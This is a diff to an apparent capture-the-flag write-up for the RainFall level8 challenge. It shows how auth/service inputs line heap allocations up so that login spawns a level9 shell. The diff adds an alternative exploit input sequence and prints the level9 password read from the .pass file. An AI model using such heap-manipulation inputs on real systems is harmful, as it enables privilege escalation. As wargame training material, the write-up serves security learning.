@@ -2,7 +2,7 @@
 
 ## Vulnerability
 
-
+Idiocy
 
 ## Context
 
@@ -41,16 +41,16 @@ auth resetservicelogin/bin/shPassword:
 ```
 Playing with these commands as input to ```level8``` we find the following:
 
-* auth    : calls ```strcpy()```, copies input following auth into global variable ```auth```.
-* service : calls ```strdup()```, copies input following service into global variable ```service```.
-* reset   : calls ```free()```, resets global variable auth.
-* login   : If auth[32] is non-zero call ```system()```. Else ```fwrite()``` displays address of global variables ```auth``` and ```service```.
+* ```auth```    : calls ```strcpy()```, copies input following auth into global variable ```auth```.
+* ```service``` : calls ```strdup()```, copies input following service into global variable ```service```.
+* ```reset```   : calls ```free()```, resets global variable auth.
+* ```login```   : If auth[32] is non-zero call ```system()```. Else ```fwrite()``` displays address of global variables ```auth``` and ```service```.
 
 malloc() places each pointer successively on the heap, with some padding. In this case we see 16 bytes between pointers.
 
 To make auth[32] non-zero we can attempt to place our ```service``` variable 32 bytes after ```auth``` on the heap.
 
-Create one pointer with command auth, then a second calling service twice. We see ```service``` is now exactly 32 bytes after ```auth```.
+Create the first pointer with command ```auth```, then a second calling ```service``` twice. We see ```service``` is now exactly 32 bytes after ```auth```.
 
 So when we call login auth[32] is non-zero and we are given a new shell as user ```level9``` where we can ```cat``` the password.
 ```
@@ -68,10 +68,20 @@ level9
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
+Alternatively, create the ```auth``` pointer first, then a second calling ```service``` with any string at least 16 bytes long.
+```
+auth I mean...
+0x804a008, (nil)
+service0123456789abcdef
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+```
 
 ## Recreate Exploited Binary
 
-As user level9, in /tmp, create and compile level8_source.c.
+As user level9, in /tmp, create and compile level8_source.c
 ```
 level9@RainFall:/tmp$ gcc level8_source.c -o level8_source
 ```
@@ -87,10 +97,8 @@ level8@RainFall:~$ /home/user/level9/level8_source
 (nil), (nil)
 auth please
 0x804a008, (nil)
-service
+service0123456789abcdef
 0x804a008, 0x804a018
-service
-0x804a008, 0x804a028
 login
 $ whoami
 level9
